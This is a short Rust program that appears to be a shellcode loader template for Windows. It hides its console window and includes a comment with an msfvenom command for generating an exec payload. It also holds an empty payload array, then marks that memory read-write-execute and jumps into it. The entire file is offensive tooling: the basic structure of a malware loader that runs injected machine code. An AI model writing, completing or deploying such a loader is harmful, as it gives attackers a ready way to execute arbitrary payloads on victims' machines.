#![windows_subsystem = "windows"]

use std::mem::{transmute_copy};

extern crate region;
use region::{Protection};

fn main() {
    //msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f rustlang
    let payload: &[u8] = &[];

    let func = unsafe { transmute_copy::<&[u8], fn()>(&payload) };

    unsafe{region::protect(payload.as_ptr(), payload.len(), Protection::READ_WRITE_EXECUTE).unwrap()};

    func();
}
